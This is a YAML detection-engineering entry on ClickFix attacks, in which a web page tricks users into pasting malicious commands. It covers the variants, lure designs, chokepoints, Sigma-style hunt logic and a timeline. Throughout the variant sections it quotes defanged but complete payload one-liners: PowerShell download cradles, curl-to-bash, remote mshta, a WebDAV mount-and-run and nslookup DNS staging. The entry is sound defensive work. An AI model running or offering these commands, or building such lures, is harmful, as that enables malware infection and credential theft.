Name: ClickFix Techniques
Id: c7f2a1b4-3e8d-4a9c-8b5f-2d1e6f0a7c3b
MitreIds:
- T1204.004
Tactics:
- Initial Access
Techniques:
- 'User Execution: Malicious Copy and Paste'
DetectionPriority: HIGH
ThreatPrevalence: HIGH
DetectionDifficulty: LOW
Description: 'Social engineering attacks that trick users into copying and executing malicious commands via clipboard manipulation.
  A malicious site instructs the user to copy a command (often disguised as a CAPTCHA fix, software update, or troubleshooting
  step) and paste it into a Run dialog, terminal, or browser address bar. The clipboard is the pivot — the scripting interpreter
  execution is the chokepoint. As of late 2024 through early 2025, nation-state actors including APT28 (Russia), MuddyWater
  (Iran), and Kimsuky (North Korea) adopted ClickFix in targeted espionage campaigns, elevating it from commodity crimeware
  to an advanced persistent threat vector.

  '
LastUpdated: '2026-03-10'
Author: '@iimp0ster'
Variations:
- Name: ClickFix
  FirstSeen: 2024-Q1
  Status: Active
  SourceURL: https://www.proofpoint.com/us/blog/threat-insight/security-brief-clickfix-social-engineering-technique-floods-threat-landscape
  NotesShort: Original variant; fake CAPTCHA or browser-fix prompts user to paste PowerShell into Run dialog
  Notes: Original variant; first documented by Proofpoint in March 2024 via TA571; fake CAPTCHA or browser fix prompts user
    to paste PowerShell into Run dialog or terminal
  VariantId: clickfix
  Lure: 'Fake Cloudflare CAPTCHA or reCAPTCHA page. User clicks "I''m not a robot" checkbox, then page displays
    "Verification Steps" instructing: 1. Press Win+R 2. Press Ctrl+V 3. Press Enter. The clipboard is silently loaded
    with the payload before the user sees the instructions. Each visit shows the user''s actual domain and a random
    Cloudflare Ray ID to reinforce legitimacy.'
  LureTags:
  - Cloudflare impersonation
  - '"I''m not a robot"'
  - Win+R instruction
  - Fake Ray ID
  Payloads:
  - Platform: Windows
    Command: 'powershell -w 1 iwr hxxps[://]daoeidk[.]info | iex  #  Verification Code 665216'
    Note: 'The "# Verification Code" comment is cosmetic — makes the command look like a CAPTCHA token in the Run dialog.
      The actual logic: iwr (Invoke-WebRequest) fetches an encoded PowerShell loader, piped to iex (Invoke-Expression) for
      immediate execution. Delivers Lumma Stealer.'
  ChokepointMapping: 'clipboard write → powershell.exe (parent: explorer.exe) → outbound HTTP to fetch second stage'
- Name: FileFix
  FirstSeen: 2025-Q2
  Status: Active
  SourceURL: https://mrd0x.com/filefix-clickfix-alternative/
  NotesShort: Shifts attack surface to Windows File Explorer address bar; weaponized within two weeks of public disclosure
  Notes: Published by researcher mr.d0x on June 23, 2025; shifts attack surface from Run dialog to Windows File Explorer address
    bar; in-the-wild campaigns observed within two weeks of public disclosure
  VariantId: filefix
  Lure: 'Same CAPTCHA/verification pretext as ClickFix, but with a file upload button (<input type="file">) that opens the
    Windows File Explorer. User is instructed to paste into the File Explorer address bar instead of the Run dialog.'
  LureTags:
  - File Explorer address bar
  - '<input type="file"> button'
  - Whitespace padding
  Payloads:
  - Platform: Windows
    Command: "\\\\attacker-server[.]com\\share\\payload.hta                    \u2190 visible in address bar\npowershell
      -ep bypass -w hidden -enc JABjAGwAaQBlAG4... \u2190 hidden via whitespace padding"
    Note: 'The visible portion looks like a file path. The actual PowerShell command is hidden after a large block of
      whitespace so it doesn''t appear in the File Explorer address bar. The user sees what looks like a UNC path; the
      system executes the hidden command.'
  ChokepointMapping: 'clipboard write → powershell.exe or mshta.exe (parent: explorer.exe) → outbound connection'
- Name: TerminalFix
  FirstSeen: 2024-Q4
  Status: Active
  SourceURL: https://huntress.com/blog/dont-sweat-clickfix-techniques
  NotesShort: Mimics terminal windows; targets IT-savvy users with same execution path
  Notes: Mimics terminal windows; targets IT-savvy users, still same execution path
  VariantId: terminalfix
  Lure: 'Mimics a terminal/console window UI. Instructs the user to open PowerShell directly (not Run dialog) and paste.
    Includes OS detection via navigator.platform to serve different payloads for Windows vs macOS.'
  LureTags:
  - Terminal UI impersonation
  - '"Open PowerShell"'
  - OS detection
  - Dual payloads
  Payloads:
  - Platform: Windows
    Command: "powershell -ep bypass -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('hxxps[://]cdn-update[.]net/stage2.ps1')\""
    Note: 'Download cradle via PowerShell. Windows users are told to open PowerShell directly.'
  - Platform: macOS
    Command: 'curl -sL hxxps[://]cdn-update[.]net/stage2.sh | bash'
    Note: 'macOS users told to open Terminal. Same clipboard-paste-execute chain, different interpreter.'
  ChokepointMapping: 'clipboard write → powershell.exe or bash (parent: varies) → outbound download cradle'
- Name: DownloadFix
  FirstSeen: 2024-Q4
  Status: Active
  SourceURL: https://huntress.com/blog/dont-sweat-clickfix-techniques
  NotesShort: Simplified delivery; user pastes a download-and-execute one-liner
  Notes: Simplified delivery; user pastes a download-and-execute one-liner
  VariantId: downloadfix
  Lure: 'Simplified — no fake CAPTCHA or terminal impersonation. Lure presents a "download required" pretext (missing codec,
    browser update, document viewer) with a single one-liner for the user to paste.'
  LureTags:
  - '"Download required"'
  - Simplified pretext
  - One-liner paste
  Payloads:
  - Platform: Windows
    Command: "powershell -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('hxxps[://]update-service[.]net/dl.ps1')\""
    Note: 'Minimal obfuscation — straightforward download cradle. The simplicity is the point: fewer instructions for the
      user to follow means higher conversion rate. Download cradle fetches a second-stage loader.'
  ChokepointMapping: 'clipboard write → powershell.exe (parent: explorer.exe) → outbound HTTP download cradle'
- Name: JackFix / GlitchFix / ConsentFix
  FirstSeen: '2025'
  Status: Active
  SourceURL: https://huntress.com/blog/dont-sweat-clickfix-techniques
  NotesShort: Family of variants using clipboard-paste-execute with different social engineering pretexts
  Notes: Expanding family of named variants using the same clipboard-paste-execute primitive with different social engineering
    pretexts (consent dialogs, glitch/error UIs); same chokepoint applies
  VariantId: jackfix-glitchfix-consentfix
  Lure: 'Expanding family using different social engineering pretexts: ConsentFix uses fake OAuth/consent dialogs ("Allow
    access to continue"). GlitchFix uses fake glitch/error UI ("Display driver error — paste fix"). JackFix uses fake
    browser hijack warnings ("Security alert — paste to resolve"). All use the same clipboard-paste-execute primitive
    with different visual wrappers.'
  LureTags:
  - Consent dialogs
  - Glitch/error UIs
  - Browser hijack warnings
  - Same primitive
  Payloads:
  - Platform: Windows
    Command: 'mshta hxxps[://]consent-verify[.]com/auth.hta'
    Note: 'These variants primarily use mshta as the interpreter, calling an HTA file from a remote URL. The HTA contains
      VBScript or JScript that downloads and executes the real payload. The social engineering pretext varies but the
      technical chain is identical across all three.'
  ChokepointMapping: 'clipboard write → mshta.exe (parent: explorer.exe) → outbound HTTP to fetch HTA'
- Name: WebDAV ClickFix
  FirstSeen: 2025-Q1
  Status: Active
  SourceURL: https://securityboulevard.com/2026/02/abusing-windows-file-explorer-and-webdav-for-malware-delivery/
  NotesShort: Victims paste UNC paths into Run dialog; mshta.exe executes JScript from attacker WebDAV share
  Notes: Hosts payloads on attacker-controlled WebDAV shares; victims paste UNC paths (\\server\share\payload.hta) into Run
    dialog, or receive .url/.lnk shortcut files that silently mount WebDAV via File Explorer; mshta.exe executes JScript/HTA
    from the share in a fileless chain that loads a .NET assembly into memory and injects shellcode into explorer.exe; steganography
    used to hide shellcode in PNG images; payloads include LummaStealer, Xworm, AsyncRAT, NetSupport, and a modified r77 rootkit;
    tactics first observed February 2024, campaign volume spiked September 2024, detailed analysis published February 2026
  VariantId: webdav-clickfix
  Lure: 'Fake verification page or document access prompt. User pastes a command that mounts a WebDAV share as a local drive,
    executes a batch file or HTA from the share, then removes the mapping. Some variants deliver .url or .lnk shortcut
    files instead.'
  LureTags:
  - WebDAV share mount
  - net use command
  - Fileless execution
  - No PowerShell
  Payloads:
  - Platform: Windows
    Command: 'cmd.exe /c net use Z: hxxp[://]94.156.170[.]255/webdav /persistent:no && "Z:\update.cmd" & net use Z: /delete'
    Note: 'No PowerShell or mshta — uses net use to mount a WebDAV share, execute update.cmd from the mapped drive, and
      delete the mapping immediately. Bypassed Microsoft Defender for Endpoint out-of-box detection. Only detected through
      RunMRU registry key threat hunting at Atos.'
  ChokepointMapping: 'clipboard write → cmd.exe (parent: explorer.exe) → outbound WebDAV mount to attacker IP'
- Name: InstallFix
  FirstSeen: 2026-Q1
  Status: Active
  SourceURL: https://www.bleepingcomputer.com/news/security/installfix-fake-claude-code-install-page-delivers-amatera-infostealer/
  NotesShort: Clones AI/developer tool install pages; distributed via Google Ads malvertising
  Notes: 'Clones legitimate software installation pages — particularly AI/developer tools such as Claude Code CLI — distributed
    via Google Ads malvertising; swaps the legitimate curl-to-bash install one-liner with a malicious equivalent pointing
    to an attacker-controlled server; exploits developer trust in official-looking documentation; Windows chain: mshta.exe
    → conhost.exe → Amatera infostealer; also targets macOS; documented by PushSecurity and BleepingComputer, February–March
    2026'
  VariantId: installfix
  Lure: 'Pixel-perfect clone of official CLI tool install pages (Claude Code, NotebookLM). Includes layout, branding,
    documentation sidebar, and code blocks. Only difference: the install command URL points to an attacker-controlled domain.
    Distributed via Google Ads malvertising for queries like "Claude Code install." No fake error or CAPTCHA needed — the
    pretext is the user wanting to install software.'
  LureTags:
  - Cloned docs page
  - curl | bash one-liner
  - No CAPTCHA / no error
  - Malvertising delivery
  Payloads:
  - Platform: macOS
    Command: 'curl -sL hxxps[://]attacker-domain[.]com/install.sh | bash'
    Note: 'macOS chain uses base64-encoded instructions fetched via curl.'
  - Platform: Windows
    Command: 'mshta hxxps[://]attacker-domain[.]co/payload'
    Note: 'Windows chain spawns cmd.exe → mshta.exe → conhost.exe to deliver the Amatera infostealer. Pages hosted on
      Cloudflare Pages, Squarespace, and Tencent EdgeOne.'
  ChokepointMapping: 'clipboard write (user copies "install" command) → mshta.exe or bash → outbound fetch from attacker domain'
- Name: Windows Terminal ClickFix
  FirstSeen: 2026-Q1
  Status: Active
  SourceURL: https://thehackernews.com/2026/03/microsoft-reveals-clickfix-campaign.html
  NotesShort: Lure uses Win+X→I shortcut; hex/XOR-encoded PowerShell in wt.exe bypasses Run-dialog detections
  Notes: 'Disclosed by Microsoft Defender Experts, March 6, 2026; lure page instructs users to open Windows Terminal via Win+X→I
    shortcut and paste a hex-encoded XOR-compressed PowerShell payload; bypasses Run-dialog detections since the parent process
    is wt.exe (WindowsTerminal.exe) rather than explorer.exe; execution chain: wt.exe → powershell.exe → cmd.exe → MSBuild.exe
    (LOLBin); final payload is Lumma Stealer delivered via renamed 7-Zip binary extracting a malicious ZIP; uses QueueUserAPC
    injection into chrome.exe and msedge.exe for credential harvesting'
  VariantId: windows-terminal-clickfix
  Lure: 'Lure page instructs users to open Windows Terminal via Win+X then I keyboard shortcut (instead of Win+R for Run
    dialog). Designed to bypass Run-dialog-based detections since the parent process is wt.exe rather than explorer.exe.'
  LureTags:
  - 'Win+X → I shortcut'
  - Windows Terminal
  - Bypasses Run dialog detections
  - wt.exe parent
  Payloads:
  - Platform: Windows
    Command: "powershell -w hidden -ep bypass -enc WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAH...\n  \u2192 decodes to:
      IEX (New-Object Net.WebClient).DownloadString('hxxps[://]c2-lumma[.]net/drop')"
    Note: 'Hex-encoded XOR-compressed payload. Execution chain: wt.exe → powershell.exe → cmd.exe → MSBuild.exe (LOLBin).
      Final payload is Lumma Stealer delivered via renamed 7-Zip binary extracting a malicious ZIP. Uses QueueUserAPC
      injection into chrome.exe and msedge.exe for credential harvesting.'
  ChokepointMapping: 'clipboard write → powershell.exe (parent: wt.exe) → outbound HTTP. Note: parent is wt.exe — hunt rules must include this parent.'
- Name: DNS-based ClickFix
  FirstSeen: 2026-Q1
  Status: Active
  SourceURL: https://www.bleepingcomputer.com/news/security/new-clickfix-attack-abuses-nslookup-to-retrieve-powershell-payload-via-dns/
  NotesShort: Payload embedded in DNS Name field response; nslookup retrieval evades URL-based web filtering
  Notes: Disclosed by Microsoft February 2026; attributed to KongTuke targeting domain-joined corporate machines; user pastes
    cmd.exe command into Run dialog that invokes nslookup against an attacker-controlled DNS IP; PowerShell payload is embedded
    in the DNS Name field response (not a TXT record — bypasses TXT-record monitoring); cmd.exe extracts and executes the
    payload, which downloads a ZIP, drops a Python-based RAT (ModeloRAT) via VBScript, and persists via a Startup folder shortcut;
    evades URL-based web filtering entirely
  VariantId: dns-based-clickfix
  Lure: 'Lure instructs user to paste a command into the Run dialog. The command uses nslookup instead of HTTP to retrieve
    the payload — evades URL-based web filtering entirely.'
  LureTags:
  - nslookup payload delivery
  - DNS Name field response
  - No HTTP involved
  - Bypasses URL filtering
  Payloads:
  - Platform: Windows
    Command: 'cmd /c "for /f "tokens=5" %a in (''nslookup example.com 84[.]21.189[.]20 2^>nul ^| find "Name"'') do powershell
      -w hidden -c "%a"'
    Note: 'Issues a DNS lookup against a threat-actor-controlled DNS server at 84[.]21.189[.]20. The response''s Name field
      contains the PowerShell payload, extracted via for /f parsing and executed. No HTTP/HTTPS involved — payload delivery
      is entirely via DNS. Final payload: Python-based RAT (ModeloRAT), persists via Startup folder shortcut.'
  ChokepointMapping: 'clipboard write → cmd.exe → nslookup.exe → powershell.exe (parent: explorer.exe) → outbound DNS to attacker-controlled IP'
Prerequisites:
- Scripting interpreter available on target system (powershell.exe, cmd.exe, mshta.exe, bash)
- Modern browser with Clipboard API enabled (default on all mainstream browsers)
AttackerControls:
- Lure design and social engineering pretext
- Obfuscation and encoding of payload
- Clipboard paste target (Run dialog, terminal, Explorer)
- Delivery mechanism (compromised site, phishing, malvertising)
- C2 infrastructure and staging domains
AttackerCannotControl:
- Clipboard write event via JavaScript API
- Script interpreter must spawn as child process
- Outbound network connection from interpreter
- Process creation event logged (Sysmon EID 1)
- Network connection event logged (Sysmon EID 3)
Chokepoints:
- Stage: Clipboard Seeding
  Input: User visits attacker-controlled or compromised page in a modern browser with Clipboard API enabled
  Invariant: Browser renders a page combining a Clipboard API write with an explicit execution instruction, and writes malicious
    command content to the Windows clipboard via navigator.clipboard.writeText or ClipboardItem
  Observable: 'Web proxy log shows page containing navigator.clipboard.writeText or ClipboardItem API call co-occurring
    with execution instruction elements (Win+R, terminal, paste references)'
  WhyCantBypass: Co-occurrence of clipboard seeding and execution hint is the invariant fingerprint across all variants —
    no visual redesign removes both elements simultaneously; the user cannot execute content that was never placed there
  LogSources:
  - Web proxy with JS/HTML content inspection
  - IOK lure-page rule feed (phish.report)
  - 'ETW Microsoft-Windows-Win32k (GUID: 8c416c79-d49b-4f01-a467-e56d3aa8234c)'
  - 'ETW Microsoft.Windows.OLE.Clipboard (GUID: 3e0e3a92-b00b-4456-9dee-f40aba77f00e)'
  DetectionTier: Research
  SigmaRef: iok-rules/clickfix/clickfix-lure.yml
  BypassNote: Clipboard ETW detection requires SilkETW or EDR with Win32k telemetry — not available via standard Sysmon configuration
  TruePositive:
    Title: 'IOK match: ClickFix lure page with clipboard API'
    Log: 'page.html: navigator.clipboard.writeText("powershell -w hidden -enc JABzAD0...") + div.innerText = "Press Win+R, paste, and hit Enter"'
    KeySignal: clipboard_api + execution_hint co-occurrence
- Stage: Interpreter Execution
  Input: User pastes clipboard content into Run dialog (Win+R), terminal, or Explorer address bar
  Invariant: User pastes clipboard content into a scripting interpreter (powershell.exe, cmd.exe, mshta.exe) spawned
    from a browser, explorer, or terminal parent (wt.exe/WindowsTerminal.exe)
  Observable: 'Sysmon EID 1 — process creation where Image is a script interpreter and ParentImage is explorer.exe,
    browser process, or wt.exe/WindowsTerminal.exe'
  WhyCantBypass: The paste-and-execute action is the entire attack primitive — no variant skips the parent-process relationship
    between the delivery surface and the interpreter
  LogSources:
  - Sysmon Event ID 1 (Process Creation)
  - Windows Security Event ID 4688 (Process Creation)
  DetectionTier: Hunt
  SigmaRef: sigma-rules/clickfix/hunt.yml
  TruePositive:
    Title: 'Sysmon EID 1: explorer.exe spawns powershell.exe with encoded command'
    Log: 'ParentImage: C:\Windows\explorer.exe | Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | CommandLine: powershell -w hidden -enc JABzAD0AbgBlAHcALQBvAGIAagBlAGMAdA...'
    KeySignal: explorer.exe → powershell.exe with -enc flag
- Stage: Second Stage Retrieval
  Input: Script interpreter is running with attacker-supplied commands in the user's session context
  Invariant: Spawned interpreter makes an outbound connection to attacker infrastructure within seconds of execution to download
    the next stage or beacon home
  Observable: 'Sysmon EID 3 — network connection where Image is a script interpreter, Initiated is true, and
    DestinationIp is not RFC1918/loopback'
  WhyCantBypass: All payloads must retrieve a next stage or establish C2 — none are fully self-contained without any network
    contact
  LogSources:
  - Sysmon Event ID 3 (Network Connection)
  - Sysmon Event ID 22 (DNS Query)
  DetectionTier: Analyst
  SigmaRef: sigma-rules/clickfix/hunt-network.yml
  BypassNote: Delayed execution (sleep before outbound) evades short time-window correlation — extend correlation window to
    5+ minutes in hunt and analyst rules
  TruePositive:
    Title: 'Sysmon EID 3: powershell.exe outbound to staging domain'
    Log: 'Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | DestinationIp: 185.244.xxx.xxx | DestinationPort: 443 | Initiated: true'
    KeySignal: interpreter outbound to non-RFC1918 IP within 30s of EID 1 event
EvolutionTimeline:
- Date: 2024-Q1
  Event: ClickFix Original
  Change: First documented by Proofpoint via TA571; no malicious attachment required — user clipboard is the entire delivery
    mechanism.
  DetectionImpact: New pattern requiring detection development
  Variants: []
  EventType: event
- Date: 2024-Q4
  Event: TerminalFix Variant
  Change: UI mimics terminal windows targeting IT-savvy users; payload and execution path unchanged.
  DetectionImpact: No change — still scripting interpreter execution
  Variants: []
  EventType: event
- Date: 2024-Q4
  Event: DownloadFix Variant
  Change: Simplified payload with direct download-execute one-liner; less obfuscation required.
  DetectionImpact: Same clipboard interaction and execution pattern
  Variants: []
  EventType: event
- Date: 2024-Q4
  Event: Nation-state adoption begins
  Change: APT28, MuddyWater (TA450), Kimsuky (TA427), and UNK_RemoteRogue adopt ClickFix; payloads shift from commodity stealers
    to RATs and APT implants.
  DetectionImpact: Payloads shift from commodity stealers (Lumma) to RATs (QuasarRAT) and APT implants; lure quality increases
    significantly; detection logic unchanged but triage priority rises
  Variants: []
  EventType: event
- Date: 2025-Q1
  Event: WebDAV ClickFix Variant
  Change: Payload delivery migrates from HTTP to WebDAV UNC paths; mshta.exe executes JScript directly from attacker share
    in a fileless chain injecting .NET assembly into explorer.exe.
  DetectionImpact: mshta.exe already in detection scope; UNC path patterns (\\\\) in CommandLine are a higher-confidence indicator;
    fileless .NET injection via VirtualAllocEx/WriteProcessMemory/CreateRemoteThread requires memory-based detection for later
    stages
  Variants: []
  EventType: event
- Date: 2025-Q2
  Event: FileFix published and weaponized within two weeks
  Change: Attack surface expands from Run dialog to File Explorer address bar; same clipboard delivery, new parent-process
    path to monitor.
  DetectionImpact: Monitor for suspicious processes spawned from explorer.exe with File Explorer address bar as vector; existing
    browser-parent rules may not catch this path
  Variants: []
  EventType: event
- Date: 2026-Q1
  Event: Windows Terminal ClickFix (Microsoft Defender Experts disclosure, March 6, 2026)
  Change: Paste target shifts to Windows Terminal (wt.exe) with hex/XOR-encoded payload; MSBuild.exe used as LOLBin; existing
    browser-parent rules miss this path entirely.
  DetectionImpact: Existing browser-parent and explorer-parent detection rules miss this path entirely; wt.exe / WindowsTerminal.exe
    must be added as parent process in Hunt and Analyst rules; PowerShell Script Block Logging required to surface hex/XOR-encoded
    commands; MSBuild.exe spawned outside build context is an additional high-fidelity pivot
  Variants: []
  EventType: event
- Date: 2026-Q1
  Event: KongTuke DNS-Staging via nslookup (Microsoft disclosure, February 2026)
  Change: Payload staging channel shifts from HTTP to DNS Name field response; nslookup queries attacker-controlled DNS server,
    evading URL-based web filtering entirely.
  DetectionImpact: Add nslookup.exe spawned by cmd.exe with a hardcoded external IP as a hunt indicator (Sysmon EID 1); monitor
    for DNS responses with anomalously large Name fields; existing browser-parent scripting interpreter rules do not catch
    this path since execution originates from the Run dialog, not a browser
  Variants: []
  EventType: event
- Date: 2026-Q1
  Event: InstallFix — Developer-Targeted ClickFix via Malvertising
  Change: Lure evolves from fake CAPTCHA to cloned developer tool install documentation distributed via Google Ads malvertising;
    execution chokepoint unchanged.
  DetectionImpact: No change to the execution chokepoint; mshta.exe → conhost.exe → infostealer is caught by existing Research
    and Hunt rules; developer endpoints require the same coverage as general enterprise endpoints
  Variants: []
  EventType: event
Detections:
- Level: Research
  Description: Identify any scripting interpreter making outbound external connections
  LogSources:
  - Sysmon Event ID 3 (Network Connection)
  - Sysmon Event ID 22 (DNS Query)
  - DNS query logs
  Logic: 'Process: powershell.exe OR cmd.exe OR wscript.exe OR cscript.exe OR mshta.exe Network: External destination (non-RFC1918)
    initiated by that process Parent: ANY

    '
  ExpectedFPRate: High
  UseCase: Threat research baseline; understanding scripting interpreter network behavior
  SigmaRule: sigma-rules/clickfix/research.yml
- Level: Hunt
  Description: 'Scripting interpreter spawned by browser, explorer, or Windows Terminal —
    process creation detection (Stage 2). For Stage 3 network confirmation, correlate
    ProcessGuid with hunt-network.yml.'
  LogSources:
  - Sysmon Event ID 1 (Process Creation)
  - Windows Security Event ID 4688 (Process Creation)
  Logic: 'Process: powershell.exe OR cmd.exe OR wscript.exe OR cscript.exe OR mshta.exe
    ParentProcess: explorer.exe OR wt.exe OR WindowsTerminal.exe
    OR chrome.exe OR firefox.exe OR msedge.exe OR brave.exe OR opera.exe
    Note: This rule is process_creation only — network correlation requires
    hunt-network.yml joined by ProcessGuid in your SIEM.'
  ExpectedFPRate: Medium
  UseCase: Proactive hunting for user-initiated clipboard execution; campaign detection
  SigmaRule: sigma-rules/clickfix/hunt.yml
- Level: Analyst
  Description: 'Browser/explorer/terminal-spawned interpreter with encoded or obfuscated command
    line (Stage 2 only — process creation). For Stage 3 network confirmation, correlate
    ProcessGuid with hunt-network.yml.'
  LogSources:
  - Sysmon Event ID 1 (Process Creation)
  - Windows Security Event ID 4688 (Process Creation)
  Logic: "Process: powershell.exe OR cmd.exe OR mshta.exe OR rundll32.exe\nParentProcess:\
    \ [browser] OR explorer.exe OR wt.exe OR WindowsTerminal.exe\nCommandLine: Contains\
    \ encoded command OR obfuscation pattern OR WebDAV/DNS indicators\n  (-enc, -EncodedCommand,\
    \ FromBase64String, IEX, Invoke-Expression, net use, nslookup, rundll32 \\\\)\n"
  ExpectedFPRate: Low
  UseCase: Automated SOC alerting; immediate IR response trigger
  SigmaRule: sigma-rules/clickfix/analyst.yml
EarlyDetections:
- Layer: Pre-Execution — ETW Clipboard Write
  Description: 'Browser process writing scripting keywords to the Windows clipboard via ETW (Microsoft-Windows-Win32k SetClipboardData).
    Fires before the user pastes. Clipboard seeding is an inescapable prerequisite for all ClickFix variants.

    '
  LogSources:
  - 'ETW Microsoft-Windows-Win32k (GUID: 8c416c79-d49b-4f01-a467-e56d3aa8234c)'
  - 'ETW Microsoft.Windows.OLE.Clipboard (GUID: 3e0e3a92-b00b-4456-9dee-f40aba77f00e)'
  - SilkETW or EDR with Win32k telemetry → Windows Event Forwarding
  Logic: 'Process: [any browser] writing to clipboard ClipboardContent contains: powershell, -enc, mshta, nslookup, cmd.exe,
    IEX, \\\\ (UNC)

    '
  ExpectedFPRate: Medium
  UseCase: On-host pre-execution detection; pairs with Sysmon EID 1 to confirm paste
  SigmaRule: sigma-rules/clickfix/etw-clipboard.yml
  Notes: Requires SilkETW or compatible EDR; not available via standard Sysmon config
- Layer: Pre-Interaction — IOK Lure Page
  Description: 'Lure page combining a JavaScript Clipboard API write with a paste-into-shell instruction. The co-occurrence
    of these two elements is the invariant fingerprint of all ClickFix variants regardless of visual design, threat actor,
    or domain. Fires at the delivery layer, before the user interacts with the page.

    '
  LogSources:
  - Web proxy with JS/HTML content inspection
  - phish.report IOK community rule feed
